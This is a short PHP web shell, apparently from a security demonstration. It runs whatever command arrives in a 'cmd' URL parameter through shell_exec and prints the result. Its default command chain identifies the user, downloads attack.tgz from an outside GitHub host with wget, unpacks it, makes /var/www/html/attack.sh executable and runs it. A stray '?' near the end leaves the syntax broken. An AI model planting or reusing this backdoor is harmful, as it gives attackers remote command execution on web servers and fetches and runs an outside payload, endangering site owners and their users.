<?php

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'pwd';
echo "Executing shell command:-> $cmd</br>";
$output = shell_exec($cmd);
echo "<pre>$output</pre>";

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'whoami';
echo "Executing shell command:-> $cmd</br>";
$output = shell_exec($cmd);
echo "<pre>$output</pre>";

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'wget https://github.com/slist/security-demo/raw/master/skullify/attack.tgz';
echo "Executing shell command:-> $cmd</br>";
$output = shell_exec($cmd);
echo "<pre>$output</pre>";

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'tar zxvf attack.tgz';
echo "Executing shell command:-> $cmd</br>";
$output = shell_exec($cmd);
echo "<pre>$output</pre>";

$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'chmod +x /var/www/html/attack.sh';
echo "Executing shell command:-> $cmd</br>";
$output = shell_exec($cmd);
echo "<pre>$output</pre>";

?$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '/var/www/html/attack.sh';
echo "Executing shell command:-> $cmd</br>";
$output = shell_exec($cmd);
echo "<pre>$output</pre>";

?>
